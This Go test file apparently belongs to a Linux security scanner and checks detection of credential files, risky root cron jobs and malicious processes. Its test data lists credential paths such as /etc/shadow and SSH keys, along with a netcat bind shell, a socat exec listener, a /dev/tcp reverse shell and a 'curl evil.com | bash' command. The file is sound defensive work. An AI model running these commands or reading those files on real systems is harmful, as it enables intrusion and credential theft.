package scanners

import (
	"os"
	"path/filepath"
	"testing"
)

func TestSecretsExactAndSuffixMatching(t *testing.T) {
	// False positives that must NOT match
	fps := []struct {
		name string
		path string
	}{
		{"box-shadow.css", "/var/www/html/css/box-shadow.css"},
		{"shadow.png", "/var/www/html/img/shadow.png"},
		{"libshadow.so", "/usr/lib/libshadow.so"},
		{"shadowsocks.json", "/etc/shadowsocks.json"},
		{"commit_history.txt", "/home/user/commit_history.txt"},
	}

	for _, tc := range fps {
		isCrit, pat := matchCriticalPattern(tc.name, tc.path)
		if isCrit {
			t.Errorf("False positive detected: %s (path: %s) matched pattern '%s'", tc.name, tc.path, pat)
		}
	}

	// True positives that MUST match
	tps := []struct {
		name string
		path string
	}{
		{"shadow", "/etc/shadow"},
		{"gshadow", "/etc/gshadow"},
		{"sudoers", "/etc/sudoers"},
		{"credentials", "/home/user/.aws/credentials"},
		{"config", "/home/user/.kube/config"},
		{"id_rsa", "/home/user/.ssh/id_rsa"},
		{"id_ed25519", "/home/user/.ssh/id_ed25519"},
		{"id_rsa.backup", "/tmp/id_rsa.backup"},
		{".bash_history", "/home/user/.bash_history"},
		{"key.kdbx", "/home/user/keepass/key.kdbx"},
	}

	for _, tc := range tps {
		isCrit, _ := matchCriticalPattern(tc.name, tc.path)
		if !isCrit {
			t.Errorf("Expected true positive to match: %s (path: %s)", tc.name, tc.path)
		}
	}
}

func TestSecretsMediumMatching(t *testing.T) {
	if isMed, _ := matchMediumPattern("box-shadow.css"); isMed {
		t.Error("box-shadow.css should not match medium pattern")
	}

	validMedium := []string{".env", ".env.local", "config.php", "client.ovpn", "database.yml"}
	for _, f := range validMedium {
		if isMed, _ := matchMediumPattern(f); !isMed {
			t.Errorf("Expected %s to match medium pattern", f)
		}
	}
}

func TestCronjobInterpretedScriptAnalysis(t *testing.T) {
	// Initialize user context
	InitUserContext()
	userCtx := GetUserContext()
	if userCtx == nil {
		t.Skip("User context unavailable")
	}

	// Create a temporary script writable by current user
	tmpDir := t.TempDir()
	scriptPath := filepath.Join(tmpDir, "backup.py")
	if err := os.WriteFile(scriptPath, []byte("#!/usr/bin/env python3\nprint('hello')\n"), 0755); err != nil {
		t.Fatalf("Failed to create test script: %v", err)
	}

	// Analyze a root cron line running python3 with the writable script
	line := "* * * * * root /usr/bin/python3 " + scriptPath
	res := analyzeCronLine(line, "/etc/cron.d/test_backup", userCtx.UID)
	if res == nil {
		t.Fatal("Expected non-nil result from analyzeCronLine")
	}

	if !res.IsDangerous {
		t.Errorf("Expected interpreted script %s to be flagged as dangerous/writable", scriptPath)
	}
}

func TestCronCompoundAnomalousJob(t *testing.T) {
	InitUserContext()
	userCtx := GetUserContext()
	if userCtx == nil {
		t.Skip("User context unavailable")
	}

	line := "* * * * * root cd /var/www/ && sudo bash .mysecretcronjob.sh"
	res := analyzeCronLine(line, "/etc/cron.d/secret_job", userCtx.UID)
	if res == nil {
		t.Fatal("Expected non-nil result from analyzeCronLine")
	}

	if !res.IsDangerous {
		t.Errorf("Expected anomalous root cron job '%s' to be flagged as dangerous", line)
	}
	if res.RiskLevel != "CRITICAL" {
		t.Errorf("Expected CRITICAL risk level for anomalous root cron job, got: %s", res.RiskLevel)
	}
	if res.Reason == "" {
		t.Error("Expected non-empty reason for flagged cron job")
	}
}

func TestCheckProcessDanger(t *testing.T) {
	userShells := map[int]string{
		33: "/usr/sbin/nologin", // www-data
	}

	// Benign processes must NOT be dangerous
	benign := []string{
		"/sbin/init splash",
		"/lib/systemd/systemd-journald",
		"/lib/systemd/systemd-udevd",
		"/usr/sbin/rsyslogd -n",
		"/usr/sbin/sshd -D",
		"/usr/sbin/apache2 -k start",
		"nginx: master process /usr/sbin/nginx",
	}
	for _, cmd := range benign {
		isDang, _ := checkProcessDanger(cmd, 0, userShells)
		if isDang {
			t.Errorf("False positive on benign system process: %s", cmd)
		}
	}

	// Malicious / dangerous processes MUST be flagged
	malicious := []struct {
		cmd string
		uid int
	}{
		{"gdb -p 1234", 0},
		{"nc -l -p 4444 -e /bin/sh", 0},
		{"socat TCP-LISTEN:1337,fork EXEC:/bin/bash", 0},
		{"bash -i >& /dev/tcp/10.10.10.10/4444 0>&1", 0},
		{"curl http://evil.com/sh | bash", 0},
		{"/bin/bash", 33}, // www-data running bash
	}
	for _, tc := range malicious {
		isDang, reason := checkProcessDanger(tc.cmd, tc.uid, userShells)
		if !isDang {
			t.Errorf("Expected dangerous process to be flagged: %s", tc.cmd)
		}
		if reason == "" {
			t.Errorf("Expected reason for dangerous process: %s", tc.cmd)
		}
	}
}
